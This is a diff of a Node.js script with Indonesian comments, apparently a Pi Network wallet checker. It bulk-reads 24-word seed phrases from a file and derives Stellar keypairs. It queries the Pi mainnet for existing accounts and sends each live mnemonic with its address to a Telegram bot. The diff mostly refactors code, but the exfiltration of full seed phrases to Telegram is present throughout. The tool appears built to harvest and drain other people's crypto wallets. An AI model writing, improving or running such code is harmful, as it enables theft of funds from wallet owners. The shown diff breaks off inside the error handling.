@@ -2,40 +2,47 @@ const fs = require('fs');
 const axios = require('axios');
 const bip39 = require('bip39');
 const edHd = require('ed25519-hd-key');
-const { Keypair, Server } = require('stellar-sdk');
+const StellarSdk = require('stellar-sdk');
 
-const server = new Server('https://api.mainnet.minepi.com');
+// Ganti dengan token dan ID chat bot Telegram kamu
+const TELEGRAM_TOKEN = 'ISI_TOKEN_TELEGRAM_KAMU';
+const TELEGRAM_CHAT_ID = 'ISI_CHAT_ID_KAMU';
 
-// 🔐 Ganti dengan token dan chat ID bot Anda
-const TELEGRAM_BOT_TOKEN = 'ISI_DENGAN_TOKEN_BOT_ANDA';
-const TELEGRAM_CHAT_ID = 'ISI_DENGAN_CHAT_ID_ANDA';
+// Setup Stellar server
+const server = new StellarSdk.Server('https://api.mainnet.minepi.com');
+const Keypair = StellarSdk.Keypair;
 
-async function sendToTelegram(text) {
-  try {
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: text,
-      parse_mode: 'Markdown'
-    });
-  } catch (err) {
-    console.error('❌ Gagal kirim ke Telegram:', err.response?.data || err.message);
-  }
-}
-
+// Fungsi mengubah mnemonic menjadi keypair Stellar
 function mnemonicToStellarKeypair(mnemonic) {
   const seed = bip39.mnemonicToSeedSync(mnemonic);
-  const { key } = edHd.derivePath("m/44'/314159'/0'", seed);
+  const { key } = edHd.derivePath("m/44'/314159'/0'", seed); // Path Pi Network
   return Keypair.fromRawEd25519Seed(key);
 }
 
+// Fungsi kirim ke Telegram
+async function sendToTelegram(message) {
+  try {
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    });
+  } catch (err) {
+    console.error("⚠️ Gagal kirim ke Telegram:", err.message);
+  }
+}
+
+// Membaca file dan filter hanya mnemonic 24 kata
 const mnemonics = fs.readFileSync('pharses.txt', 'utf8')
   .split('\n')
   .map(line => line.trim())
   .filter(line => line.split(' ').length === 24);
 
+// Kosongkan isi file output
 fs.writeFileSync('valid.txt', '');
 fs.writeFileSync('invalid.txt', '');
 
+// Proses semua mnemonic
 async function checkMnemonics(list) {
   for (const mnemonic of list) {
     try {
@@ -44,10 +51,11 @@ async function checkMnemonics(list) {
 
       await server.loadAccount(pubkey);
 
-      const msg = `✅ *Terdaftar*\n🧠 Mnemonic:\n\`${mnemonic}\`\n🔐 Public Key: \`${pubkey}\``;
-      console.log(msg);
+      console.log(`✅ Terdaftar: ${pubkey}`);
       fs.appendFileSync('valid.txt', mnemonic + '\n');
-      await sendToTelegram(msg);
+
+      const message = `✅ *Mnemonic valid & terdaftar:*\n\`\`\`\n${mnemonic}\n\`\`\`\n🔐 *Address:* \`${pubkey}\``;
+      await sendToTelegram(message);
 
     } catch (err) {
       if (err.response && err.response.status === 404) {
